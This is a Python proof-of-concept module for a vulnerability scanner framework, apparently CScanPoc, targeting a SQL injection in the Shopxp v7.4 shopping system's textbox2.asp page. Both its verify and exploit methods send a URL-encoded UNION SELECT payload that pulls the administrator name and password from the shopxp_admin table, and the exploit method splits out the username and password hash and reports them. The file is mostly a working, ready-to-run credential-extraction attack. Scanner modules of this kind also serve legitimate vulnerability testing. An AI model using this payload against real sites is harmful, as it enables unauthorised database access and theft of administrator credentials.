# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Shopxp_0003'  # 平台漏洞编号，留空
    name = 'Shopxp v7.4 /textbox2.asp SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-09-05'  # 漏洞公布时间
    desc = '''
        Shopxp网上购物系统是一个经过完善设计的经典商城购物管理系统，适用于各种服务器环境的高效网上购物网站建设解决方案。基于asp＋Access、Mssql为免费开源程序，在互联网上有广泛的应用。
        Shopxp v7.4版本中的textbox2.asp文件设计缺陷导致SQL注入漏洞的产生,严重威胁网站以及服务器的安全.
    '''  # 漏洞描述
    ref = 'https://www.webshell.cc/1154.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shopxp'  # 漏洞应用名称
    product_version = '7.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ba0f413-8383-4b15-b273-93008df1ac36'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
                       "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(
                r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>', re.I | re.S)
            match = pattern.match(content)

            if match != None and match.group('account').strip() != "":
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
                       "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(
                r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>', re.I | re.S)
            match = pattern.match(content)

            if match != None and match.group('account').strip() != "":
                account = match.group('account').strip()
                username = account[:-16]
                password = account[-16:]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
